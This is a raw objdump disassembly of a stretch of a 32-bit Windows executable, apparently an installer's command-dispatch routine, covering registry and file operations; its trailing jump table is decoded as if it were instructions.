  4024c5:	ff 15 28 80 40 00    	call   *0x408028
  4024cb:	85 c0                	test   %eax,%eax
  4024cd:	75 03                	jne    0x4024d2
  4024cf:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4024d2:	ff 75 08             	push   0x8(%ebp)
  4024d5:	e9 cf 00 00 00       	jmp    0x4025a9
  4024da:	68 19 00 02 00       	push   $0x20019
  4024df:	e8 88 06 00 00       	call   0x402b6c
  4024e4:	6a 33                	push   $0x33
  4024e6:	8b f8                	mov    %eax,%edi
  4024e8:	e8 3f 06 00 00       	call   0x402b2c
  4024ed:	3b fb                	cmp    %ebx,%edi
  4024ef:	88 1e                	mov    %bl,(%esi)
  4024f1:	0f 84 8c 02 00 00    	je     0x402783
  4024f7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4024fa:	c7 45 f0 00 04 00 00 	movl   $0x400,-0x10(%ebp)
  402501:	51                   	push   %ecx
  402502:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402505:	56                   	push   %esi
  402506:	51                   	push   %ecx
  402507:	53                   	push   %ebx
  402508:	50                   	push   %eax
  402509:	57                   	push   %edi
  40250a:	ff 15 2c 80 40 00    	call   *0x40802c
  402510:	33 c9                	xor    %ecx,%ecx
  402512:	41                   	inc    %ecx
  402513:	85 c0                	test   %eax,%eax
  402515:	75 2e                	jne    0x402545
  402517:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40251b:	74 13                	je     0x402530
  40251d:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402520:	74 06                	je     0x402528
  402522:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402526:	75 1d                	jne    0x402545
  402528:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40252b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40252e:	eb 72                	jmp    0x4025a2
  402530:	ff 36                	push   (%esi)
  402532:	33 c0                	xor    %eax,%eax
  402534:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402537:	56                   	push   %esi
  402538:	0f 94 c0             	sete   %al
  40253b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40253e:	e8 5c 3b 00 00       	call   0x40609f
  402543:	eb 63                	jmp    0x4025a8
  402545:	88 1e                	mov    %bl,(%esi)
  402547:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40254a:	eb 5c                	jmp    0x4025a8
  40254c:	68 19 00 02 00       	push   $0x20019
  402551:	e8 16 06 00 00       	call   0x402b6c
  402556:	6a 03                	push   $0x3
  402558:	8b f8                	mov    %eax,%edi
  40255a:	e8 ab 05 00 00       	call   0x402b0a
  40255f:	3b fb                	cmp    %ebx,%edi
  402561:	59                   	pop    %ecx
  402562:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402565:	88 1e                	mov    %bl,(%esi)
  402567:	0f 84 16 02 00 00    	je     0x402783
  40256d:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402570:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402575:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402578:	74 0c                	je     0x402586
  40257a:	51                   	push   %ecx
  40257b:	56                   	push   %esi
  40257c:	50                   	push   %eax
  40257d:	57                   	push   %edi
  40257e:	ff 15 30 80 40 00    	call   *0x408030
  402584:	eb 1c                	jmp    0x4025a2
  402586:	53                   	push   %ebx
  402587:	53                   	push   %ebx
  402588:	53                   	push   %ebx
  402589:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40258c:	53                   	push   %ebx
  40258d:	51                   	push   %ecx
  40258e:	56                   	push   %esi
  40258f:	50                   	push   %eax
  402590:	57                   	push   %edi
  402591:	ff 15 18 80 40 00    	call   *0x408018
  402597:	85 c0                	test   %eax,%eax
  402599:	74 07                	je     0x4025a2
  40259b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4025a2:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  4025a8:	57                   	push   %edi
  4025a9:	ff 15 24 80 40 00    	call   *0x408024
  4025af:	e9 04 04 00 00       	jmp    0x4029b8
  4025b4:	56                   	push   %esi
  4025b5:	e8 fe 3a 00 00       	call   0x4060b8
  4025ba:	3b c3                	cmp    %ebx,%eax
  4025bc:	0f 84 f6 03 00 00    	je     0x4029b8
  4025c2:	50                   	push   %eax
  4025c3:	e9 c5 f9 ff ff       	jmp    0x401f8d
  4025c8:	6a ed                	push   $0xffffffed
  4025ca:	e8 5d 05 00 00       	call   0x402b2c
  4025cf:	ff 75 d4             	push   -0x2c(%ebp)
  4025d2:	ff 75 d0             	push   -0x30(%ebp)
  4025d5:	50                   	push   %eax
  4025d6:	e8 ff 36 00 00       	call   0x405cda
  4025db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4025de:	0f 84 9d 01 00 00    	je     0x402781
  4025e4:	50                   	push   %eax
  4025e5:	e9 7f ef ff ff       	jmp    0x401569
  4025ea:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4025ed:	74 14                	je     0x402603
  4025ef:	33 ff                	xor    %edi,%edi
  4025f1:	47                   	inc    %edi
  4025f2:	57                   	push   %edi
  4025f3:	e8 12 05 00 00       	call   0x402b0a
  4025f8:	59                   	pop    %ecx
  4025f9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025fc:	a2 00 a8 40 00       	mov    %al,0x40a800
  402601:	eb 0f                	jmp    0x402612
  402603:	6a 11                	push   $0x11
  402605:	e8 22 05 00 00       	call   0x402b2c
  40260a:	50                   	push   %eax
  40260b:	e8 47 3b 00 00       	call   0x406157
  402610:	8b f8                	mov    %eax,%edi
  402612:	38 1e                	cmp    %bl,(%esi)
  402614:	0f 84 69 01 00 00    	je     0x402783
  40261a:	56                   	push   %esi
  40261b:	e8 98 3a 00 00       	call   0x4060b8
  402620:	57                   	push   %edi
  402621:	68 00 a8 40 00       	push   $0x40a800
  402626:	50                   	push   %eax
  402627:	e8 55 37 00 00       	call   0x405d81
  40262c:	e9 7d ef ff ff       	jmp    0x4015ae
  402631:	6a 02                	push   $0x2
  402633:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402636:	e8 cf 04 00 00       	call   0x402b0a
  40263b:	83 f8 01             	cmp    $0x1,%eax
  40263e:	59                   	pop    %ecx
  40263f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402642:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402645:	0f 8c 6d 03 00 00    	jl     0x4029b8
  40264b:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402650:	3b c1                	cmp    %ecx,%eax
  402652:	7e 03                	jle    0x402657
  402654:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402657:	38 1e                	cmp    %bl,(%esi)
  402659:	0f 84 82 00 00 00    	je     0x4026e1
  40265f:	56                   	push   %esi
  402660:	88 5d 0b             	mov    %bl,0xb(%ebp)
  402663:	e8 50 3a 00 00       	call   0x4060b8
  402668:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  40266b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40266e:	7e 71                	jle    0x4026e1
  402670:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402673:	8d 45 eb             	lea    -0x15(%ebp),%eax
  402676:	6a 01                	push   $0x1
  402678:	50                   	push   %eax
  402679:	ff 75 e4             	push   -0x1c(%ebp)
  40267c:	e8 d1 36 00 00       	call   0x405d52
  402681:	85 c0                	test   %eax,%eax
  402683:	74 5f                	je     0x4026e4
  402685:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402688:	75 21                	jne    0x4026ab
  40268a:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40268e:	74 2b                	je     0x4026bb
  402690:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402694:	74 25                	je     0x4026bb
  402696:	8a 45 eb             	mov    -0x15(%ebp),%al
  402699:	88 04 3e             	mov    %al,(%esi,%edi,1)
  40269c:	46                   	inc    %esi
  40269d:	3a c3                	cmp    %bl,%al
  40269f:	88 45 0b             	mov    %al,0xb(%ebp)
  4026a2:	74 40                	je     0x4026e4
  4026a4:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  4026a7:	7c ca                	jl     0x402673
  4026a9:	eb 39                	jmp    0x4026e4
  4026ab:	0f b6 45 eb          	movzbl -0x15(%ebp),%eax
  4026af:	50                   	push   %eax
  4026b0:	57                   	push   %edi
  4026b1:	e8 e9 39 00 00       	call   0x40609f
  4026b6:	e9 06 03 00 00       	jmp    0x4029c1
  4026bb:	8a 45 eb             	mov    -0x15(%ebp),%al
  4026be:	38 45 0b             	cmp    %al,0xb(%ebp)
  4026c1:	74 0e                	je     0x4026d1
  4026c3:	3c 0d                	cmp    $0xd,%al
  4026c5:	74 04                	je     0x4026cb
  4026c7:	3c 0a                	cmp    $0xa,%al
  4026c9:	75 06                	jne    0x4026d1
  4026cb:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4026ce:	46                   	inc    %esi
  4026cf:	eb 13                	jmp    0x4026e4
  4026d1:	6a 01                	push   $0x1
  4026d3:	53                   	push   %ebx
  4026d4:	6a ff                	push   $0xffffffff
  4026d6:	ff 75 e4             	push   -0x1c(%ebp)
  4026d9:	ff 15 38 81 40 00    	call   *0x408138
  4026df:	eb 03                	jmp    0x4026e4
  4026e1:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4026e4:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  4026e7:	3b f3                	cmp    %ebx,%esi
  4026e9:	e9 c2 ee ff ff       	jmp    0x4015b0
  4026ee:	38 1e                	cmp    %bl,(%esi)
  4026f0:	0f 84 c2 02 00 00    	je     0x4029b8
  4026f6:	6a 02                	push   $0x2
  4026f8:	e8 0d 04 00 00       	call   0x402b0a
  4026fd:	59                   	pop    %ecx
  4026fe:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402701:	ff 75 d8             	push   -0x28(%ebp)
  402704:	53                   	push   %ebx
  402705:	50                   	push   %eax
  402706:	56                   	push   %esi
  402707:	e8 ac 39 00 00       	call   0x4060b8
  40270c:	50                   	push   %eax
  40270d:	ff 15 38 81 40 00    	call   *0x408138
  402713:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402716:	0f 8c 9c 02 00 00    	jl     0x4029b8
  40271c:	e9 3d 02 00 00       	jmp    0x40295e
  402721:	56                   	push   %esi
  402722:	e8 91 39 00 00       	call   0x4060b8
  402727:	3b c3                	cmp    %ebx,%eax
  402729:	0f 84 89 02 00 00    	je     0x4029b8
  40272f:	50                   	push   %eax
  402730:	ff 15 34 81 40 00    	call   *0x408134
  402736:	e9 7d 02 00 00       	jmp    0x4029b8
  40273b:	57                   	push   %edi
  40273c:	e8 77 39 00 00       	call   0x4060b8
  402741:	3b c3                	cmp    %ebx,%eax
  402743:	74 12                	je     0x402757
  402745:	8d 8d 38 fe ff ff    	lea    -0x1c8(%ebp),%ecx
  40274b:	51                   	push   %ecx
  40274c:	50                   	push   %eax
  40274d:	ff 15 30 81 40 00    	call   *0x408130
  402753:	85 c0                	test   %eax,%eax
  402755:	75 3f                	jne    0x402796
  402757:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40275e:	88 1e                	mov    %bl,(%esi)
  402760:	e9 53 02 00 00       	jmp    0x4029b8
  402765:	6a 02                	push   $0x2
  402767:	e8 c0 03 00 00       	call   0x402b2c
  40276c:	8d 8d 38 fe ff ff    	lea    -0x1c8(%ebp),%ecx
  402772:	51                   	push   %ecx
  402773:	50                   	push   %eax
  402774:	ff 15 2c 81 40 00    	call   *0x40812c
  40277a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40277d:	75 10                	jne    0x40278f
  40277f:	88 1f                	mov    %bl,(%edi)
  402781:	88 1e                	mov    %bl,(%esi)
  402783:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40278a:	e9 29 02 00 00       	jmp    0x4029b8
  40278f:	50                   	push   %eax
  402790:	57                   	push   %edi
  402791:	e8 09 39 00 00       	call   0x40609f
  402796:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  40279c:	50                   	push   %eax
  40279d:	56                   	push   %esi
  40279e:	e9 33 01 00 00       	jmp    0x4028d6
  4027a3:	6a f0                	push   $0xfffffff0
  4027a5:	c7 45 f4 66 fd ff ff 	movl   $0xfffffd66,-0xc(%ebp)
  4027ac:	e8 7b 03 00 00       	call   0x402b2c
  4027b1:	8b f0                	mov    %eax,%esi
  4027b3:	56                   	push   %esi
  4027b4:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  4027b7:	e8 8a 33 00 00       	call   0x405b46
  4027bc:	85 c0                	test   %eax,%eax
  4027be:	75 07                	jne    0x4027c7
  4027c0:	6a ed                	push   $0xffffffed
  4027c2:	e8 65 03 00 00       	call   0x402b2c
  4027c7:	56                   	push   %esi
  4027c8:	e8 e8 34 00 00       	call   0x405cb5
  4027cd:	6a 02                	push   $0x2
  4027cf:	68 00 00 00 40       	push   $0x40000000
  4027d4:	56                   	push   %esi
  4027d5:	e8 00 35 00 00       	call   0x405cda
  4027da:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027dd:	89 45 08             	mov    %eax,0x8(%ebp)
  4027e0:	0f 84 97 00 00 00    	je     0x40287d
  4027e6:	a1 38 47 42 00       	mov    0x424738,%eax
  4027eb:	8b 35 58 81 40 00    	mov    0x408158,%esi
  4027f1:	50                   	push   %eax
  4027f2:	6a 40                	push   $0x40
  4027f4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4027f7:	ff d6                	call   *%esi
  4027f9:	8b f8                	mov    %eax,%edi
  4027fb:	3b fb                	cmp    %ebx,%edi
  4027fd:	74 75                	je     0x402874
  4027ff:	53                   	push   %ebx
  402800:	e8 37 0b 00 00       	call   0x40333c
  402805:	ff 75 e4             	push   -0x1c(%ebp)
  402808:	57                   	push   %edi
  402809:	e8 18 0b 00 00       	call   0x403326
  40280e:	ff 75 d4             	push   -0x2c(%ebp)
  402811:	6a 40                	push   $0x40
  402813:	ff d6                	call   *%esi
  402815:	8b f0                	mov    %eax,%esi
  402817:	3b f3                	cmp    %ebx,%esi
  402819:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40281c:	74 34                	je     0x402852
  40281e:	ff 75 d4             	push   -0x2c(%ebp)
  402821:	56                   	push   %esi
  402822:	53                   	push   %ebx
  402823:	ff 75 d0             	push   -0x30(%ebp)
  402826:	e8 8a 08 00 00       	call   0x4030b5
  40282b:	eb 18                	jmp    0x402845
  40282d:	8b 0e                	mov    (%esi),%ecx
  40282f:	8b 46 04             	mov    0x4(%esi),%eax
  402832:	83 c6 08             	add    $0x8,%esi
  402835:	51                   	push   %ecx
  402836:	03 c7                	add    %edi,%eax
  402838:	56                   	push   %esi
  402839:	50                   	push   %eax
  40283a:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40283d:	e8 53 34 00 00       	call   0x405c95
  402842:	03 75 b8             	add    -0x48(%ebp),%esi
  402845:	38 1e                	cmp    %bl,(%esi)
  402847:	75 e4                	jne    0x40282d
  402849:	ff 75 f0             	push   -0x10(%ebp)
  40284c:	ff 15 5c 81 40 00    	call   *0x40815c
  402852:	ff 75 e4             	push   -0x1c(%ebp)
  402855:	57                   	push   %edi
  402856:	ff 75 08             	push   0x8(%ebp)
  402859:	e8 23 35 00 00       	call   0x405d81
  40285e:	57                   	push   %edi
  40285f:	ff 15 5c 81 40 00    	call   *0x40815c
  402865:	53                   	push   %ebx
  402866:	53                   	push   %ebx
  402867:	ff 75 08             	push   0x8(%ebp)
  40286a:	6a ff                	push   $0xffffffff
  40286c:	e8 44 08 00 00       	call   0x4030b5
  402871:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402874:	ff 75 08             	push   0x8(%ebp)
  402877:	ff 15 14 81 40 00    	call   *0x408114
  40287d:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  402880:	6a f3                	push   $0xfffffff3
  402882:	5e                   	pop    %esi
  402883:	7d 13                	jge    0x402898
  402885:	6a ef                	push   $0xffffffef
  402887:	5e                   	pop    %esi
  402888:	ff 75 b4             	push   -0x4c(%ebp)
  40288b:	ff 15 28 81 40 00    	call   *0x408128
  402891:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402898:	56                   	push   %esi
  402899:	e9 06 fa ff ff       	jmp    0x4022a4
  40289e:	53                   	push   %ebx
  40289f:	e8 66 02 00 00       	call   0x402b0a
  4028a4:	3b 05 6c 47 42 00    	cmp    0x42476c,%eax
  4028aa:	59                   	pop    %ecx
  4028ab:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4028ae:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028b1:	0f 83 cc fe ff ff    	jae    0x402783
  4028b7:	8b f0                	mov    %eax,%esi
  4028b9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4028bc:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  4028c2:	03 35 68 47 42 00    	add    0x424768,%esi
  4028c8:	3b c3                	cmp    %ebx,%eax
  4028ca:	7c 17                	jl     0x4028e3
  4028cc:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4028cf:	75 0f                	jne    0x4028e0
  4028d1:	83 c6 18             	add    $0x18,%esi
  4028d4:	56                   	push   %esi
  4028d5:	57                   	push   %edi
  4028d6:	e8 66 38 00 00       	call   0x406141
  4028db:	e9 d8 00 00 00       	jmp    0x4029b8
  4028e0:	51                   	push   %ecx
  4028e1:	eb 7c                	jmp    0x40295f
  4028e3:	83 c9 ff             	or     $0xffffffff,%ecx
  4028e6:	2b c8                	sub    %eax,%ecx
  4028e8:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4028eb:	74 10                	je     0x4028fd
  4028ed:	6a 01                	push   $0x1
  4028ef:	e8 16 02 00 00       	call   0x402b0a
  4028f4:	59                   	pop    %ecx
  4028f5:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  4028f8:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4028fb:	eb 10                	jmp    0x40290d
  4028fd:	ff 75 dc             	push   -0x24(%ebp)
  402900:	8d 46 18             	lea    0x18(%esi),%eax
  402903:	50                   	push   %eax
  402904:	e8 5a 38 00 00       	call   0x406163
  402909:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  40290d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402910:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  402913:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402916:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402919:	0f 84 99 00 00 00    	je     0x4029b8
  40291f:	ff 75 ec             	push   -0x14(%ebp)
  402922:	e8 56 e8 ff ff       	call   0x40117d
  402927:	e9 8c 00 00 00       	jmp    0x4029b8
  40292c:	53                   	push   %ebx
  40292d:	e8 d8 01 00 00       	call   0x402b0a
  402932:	83 f8 20             	cmp    $0x20,%eax
  402935:	59                   	pop    %ecx
  402936:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402939:	0f 83 44 fe ff ff    	jae    0x402783
  40293f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402942:	74 23                	je     0x402967
  402944:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  402947:	74 0f                	je     0x402958
  402949:	50                   	push   %eax
  40294a:	e8 4a e9 ff ff       	call   0x401299
  40294f:	53                   	push   %ebx
  402950:	53                   	push   %ebx
  402951:	e8 99 e8 ff ff       	call   0x4011ef
  402956:	eb 60                	jmp    0x4029b8
  402958:	53                   	push   %ebx
  402959:	e8 84 e9 ff ff       	call   0x4012e2
  40295e:	50                   	push   %eax
  40295f:	57                   	push   %edi
  402960:	e8 3a 37 00 00       	call   0x40609f
  402965:	eb 51                	jmp    0x4029b8
  402967:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  40296a:	74 12                	je     0x40297e
  40296c:	8b 15 34 47 42 00    	mov    0x424734,%edx
  402972:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  402975:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40297c:	eb 3a                	jmp    0x4029b8
  40297e:	8b 0d 34 47 42 00    	mov    0x424734,%ecx
  402984:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  40298b:	57                   	push   %edi
  40298c:	e8 d2 37 00 00       	call   0x406163
  402991:	eb 25                	jmp    0x4029b8
  402993:	8b 0d 30 1d 42 00    	mov    0x421d30,%ecx
  402999:	53                   	push   %ebx
  40299a:	23 c8                	and    %eax,%ecx
  40299c:	51                   	push   %ecx
  40299d:	6a 0b                	push   $0xb
  40299f:	ff 75 f8             	push   -0x8(%ebp)
  4029a2:	ff 15 00 82 40 00    	call   *0x408200
  4029a8:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  4029ab:	74 0b                	je     0x4029b8
  4029ad:	53                   	push   %ebx
  4029ae:	53                   	push   %ebx
  4029af:	ff 75 f8             	push   -0x8(%ebp)
  4029b2:	ff 15 fc 81 40 00    	call   *0x4081fc
  4029b8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029bb:	01 05 c8 47 42 00    	add    %eax,0x4247c8
  4029c1:	33 c0                	xor    %eax,%eax
  4029c3:	5f                   	pop    %edi
  4029c4:	5e                   	pop    %esi
  4029c5:	5b                   	pop    %ebx
  4029c6:	c9                   	leave
  4029c7:	c2 04 00             	ret    $0x4
  4029ca:	c3                   	ret
  4029cb:	29 40 00             	sub    %eax,0x0(%eax)
  4029ce:	90                   	nop
  4029cf:	14 40                	adc    $0x40,%al
  4029d1:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  4029d8:	40                   	inc    %eax
  4029d9:	00 ca                	add    %cl,%dl
  4029db:	14 40                	adc    $0x40,%al
  4029dd:	00 d6                	add    %dl,%dh
  4029df:	14 40                	adc    $0x40,%al
  4029e1:	00 f4                	add    %dh,%ah
  4029e3:	14 40                	adc    $0x40,%al
  4029e5:	00 6f 15             	add    %ch,0x15(%edi)
  4029e8:	40                   	inc    %eax
  4029e9:	00 9d 15 40 00 bb    	add    %bl,-0x44ffbfeb(%ebp)
  4029ef:	15 40 00 59 16       	adc    $0x16590040,%eax
  4029f4:	40                   	inc    %eax
  4029f5:	00 02                	add    %al,(%edx)
  4029f7:	15 40 00 41 15       	adc    $0x15410040,%eax
  4029fc:	40                   	inc    %eax
  4029fd:	00 62 15             	add    %ah,0x15(%edx)
  402a00:	40                   	inc    %eax
  402a01:	00 6a 16             	add    %ch,0x16(%edx)
  402a04:	40                   	inc    %eax
  402a05:	00 bb 16 40 00 1f    	add    %bh,0x1f004016(%ebx)
  402a0b:	17                   	pop    %ss
  402a0c:	40                   	inc    %eax
  402a0d:	00 46 17             	add    %al,0x17(%esi)
  402a10:	40                   	inc    %eax
  402a11:	00 59 17             	add    %bl,0x17(%ecx)
  402a14:	40                   	inc    %eax
  402a15:	00 fd                	add    %bh,%ch
  402a17:	18 40 00             	sbb    %al,0x0(%eax)
  402a1a:	00 19                	add    %bl,(%ecx)
  402a1c:	40                   	inc    %eax
  402a1d:	00 32                	add    %dh,(%edx)
  402a1f:	19 40 00             	sbb    %eax,0x0(%eax)
  402a22:	47                   	inc    %edi
  402a23:	19 40 00             	sbb    %eax,0x0(%eax)
  402a26:	59                   	pop    %ecx
  402a27:	19 40 00             	sbb    %eax,0x0(%eax)
  402a2a:	ed                   	in     (%dx),%eax
  402a2b:	19 40 00             	sbb    %eax,0x0(%eax)
  402a2e:	1e                   	push   %ds
  402a2f:	1a 40 00             	sbb    0x0(%eax),%al
  402a32:	5e                   	pop    %esi
  402a33:	1a 40 00             	sbb    0x0(%eax),%al
  402a36:	9e                   	sahf
  402a37:	1a 40 00             	sbb    0x0(%eax),%al
  402a3a:	3f                   	aas
  402a3b:	1b 40 00             	sbb    0x0(%eax),%eax
  402a3e:	63 1b                	arpl   %ebx,(%ebx)
  402a40:	40                   	inc    %eax
  402a41:	00 0a                	add    %cl,(%edx)
  402a43:	1c 40                	sbb    $0x40,%al
  402a45:	00 0a                	add    %cl,(%edx)
  402a47:	1c 40                	sbb    $0x40,%al
  402a49:	00 da                	add    %bl,%dl
  402a4b:	1c 40                	sbb    $0x40,%al
  402a4d:	00 fb                	add    %bh,%bl
  402a4f:	1c 40                	sbb    $0x40,%al
  402a51:	00 20                	add    %ah,(%eax)
  402a53:	1d 40 00 41 1d       	sbb    $0x1d410040,%eax
  402a58:	40                   	inc    %eax
  402a59:	00 ff                	add    %bh,%bh
  402a5b:	1d 40 00 8f 1e       	sbb    $0x1e8f0040,%eax
  402a60:	40                   	inc    %eax
  402a61:	00 c3                	add    %al,%bl
  402a63:	1e                   	push   %ds
  402a64:	40                   	inc    %eax
  402a65:	00 48 1f             	add    %cl,0x1f(%eax)
  402a68:	40                   	inc    %eax
  402a69:	00 98 1f 40 00 c8    	add    %bl,-0x37ffbfe1(%eax)
  402a6f:	1f                   	pop    %ds
  402a70:	40                   	inc    %eax
  402a71:	00 69 20             	add    %ch,0x20(%ecx)
  402a74:	40                   	inc    %eax
  402a75:	00 38                	add    %bh,(%eax)
  402a77:	21 40 00             	and    %eax,0x0(%eax)
  402a7a:	b2 22                	mov    $0x22,%dl
  402a7c:	40                   	inc    %eax
  402a7d:	00 34 23             	add    %dh,(%ebx,%eiz,1)
  402a80:	40                   	inc    %eax
  402a81:	00 63 23             	add    %ah,0x23(%ebx)
  402a84:	40                   	inc    %eax
  402a85:	00 a7 23 40 00 e8    	add    %ah,-0x17ffbfdd(%edi)
  402a8b:	23 40 00             	and    0x0(%eax),%eax
  402a8e:	3d 24 40 00 da       	cmp    $0xda004024,%eax
  402a93:	24 40                	and    $0x40,%al
  402a95:	00 4c 25 40          	add    %cl,0x40(%ebp,%eiz,1)
  402a99:	00 b4 25 40 00 c8 25 	add    %dh,0x25c80040(%ebp,%eiz,1)
  402aa0:	40                   	inc    %eax
  402aa1:	00 ea                	add    %ch,%dl
  402aa3:	25 40 00 31 26       	and    $0x26310040,%eax
  402aa8:	40                   	inc    %eax
  402aa9:	00 ee                	add    %ch,%dh
  402aab:	26 40                	es inc %eax
  402aad:	00 21                	add    %ah,(%ecx)
  402aaf:	27                   	daa
  402ab0:	40                   	inc    %eax
  402ab1:	00 3b                	add    %bh,(%ebx)
  402ab3:	27                   	daa
  402ab4:	40                   	inc    %eax
  402ab5:	00 65 27             	add    %ah,0x27(%ebp)
  402ab8:	40                   	inc    %eax
  402ab9:	00 a3 27 40 00 9e    	add    %ah,-0x61ffbfd9(%ebx)
  402abf:	28 40 00             	sub    %al,0x0(%eax)
  402ac2:	2c 29                	sub    $0x29,%al
  402ac4:	40                   	inc    %eax
  402ac5:	00 b8 29 40 00 b8    	add    %bh,-0x47ffbfd7(%eax)
  402acb:	29 40 00             	sub    %eax,0x0(%eax)
  402ace:	93                   	xchg   %eax,%ebx
  402acf:	29 40 00             	sub    %eax,0x0(%eax)
  402ad2:	ca 1a 40             	lret   $0x401a
  402ad5:	00 ce                	add    %cl,%dh
  402ad7:	1a 40 00             	sbb    0x0(%eax),%al
  402ada:	d2 1a                	rcrb   %cl,(%edx)
  402adc:	40                   	inc    %eax
  402add:	00 d7                	add    %dl,%bh
  402adf:	1a 40 00             	sbb    0x0(%eax),%al
  402ae2:	e4 1a                	in     $0x1a,%al
  402ae4:	40                   	inc    %eax
  402ae5:	00 e8                	add    %ch,%al
  402ae7:	1a 40 00             	sbb    0x0(%eax),%al
  402aea:	ec                   	in     (%dx),%al
  402aeb:	1a 40 00             	sbb    0x0(%eax),%al
  402aee:	f2 1a 40 00          	repnz sbb 0x0(%eax),%al
  402af2:	fb                   	sti
  402af3:	1a 40 00             	sbb    0x0(%eax),%al
  402af6:	05 1b 40 00 12       	add    $0x1200401b,%eax
  402afb:	1b 40 00             	sbb    0x0(%eax),%eax
  402afe:	2a 1b                	sub    (%ebx),%bl
  402b00:	40                   	inc    %eax
  402b01:	00 2e                	add    %ch,(%esi)
  402b03:	1b 40 00             	sbb    0x0(%eax),%eax
  402b06:	32 1b                	xor    (%ebx),%bl
  402b08:	40                   	inc    %eax
  402b09:	00 8b 44 24 04 8b    	add    %cl,-0x74fbdbbc(%ebx)
  402b0f:	0d 3c b8 40 00       	or     $0x40b83c,%eax
  402b14:	56                   	push   %esi
  402b15:	ff 34 81             	push   (%ecx,%eax,4)
  402b18:	6a 00                	push   $0x0
  402b1a:	e8 44 36 00 00       	call   0x406163
  402b1f:	8b f0                	mov    %eax,%esi
  402b21:	56                   	push   %esi
  402b22:	e8 91 35 00 00       	call   0x4060b8
  402b27:	0f be 16             	movsbl (%esi),%edx
  402b2a:	5e                   	pop    %esi
  402b2b:	c3                   	ret
  402b2c:	56                   	push   %esi
  402b2d:	8b 74 24 08          	mov    0x8(%esp),%esi
  402b31:	85 f6                	test   %esi,%esi
  402b33:	57                   	push   %edi
  402b34:	8b c6                	mov    %esi,%eax
  402b36:	7d 02                	jge    0x402b3a
  402b38:	f7 d8                	neg    %eax
  402b3a:	8b 15 3c b8 40 00    	mov    0x40b83c,%edx
  402b40:	8b c8                	mov    %eax,%ecx
  402b42:	83 e1 0f             	and    $0xf,%ecx
  402b45:	c1 f8 04             	sar    $0x4,%eax
  402b48:	ff 34 8a             	push   (%edx,%ecx,4)
  402b4b:	c1 e0 0a             	shl    $0xa,%eax
  402b4e:	05 00 a4 40 00       	add    $0x40a400,%eax
  402b53:	50                   	push   %eax
  402b54:	e8 0a 36 00 00       	call   0x406163
  402b59:	85 f6                	test   %esi,%esi
  402b5b:	8b f8                	mov    %eax,%edi
  402b5d:	7d 06                	jge    0x402b65
  402b5f:	57                   	push   %edi
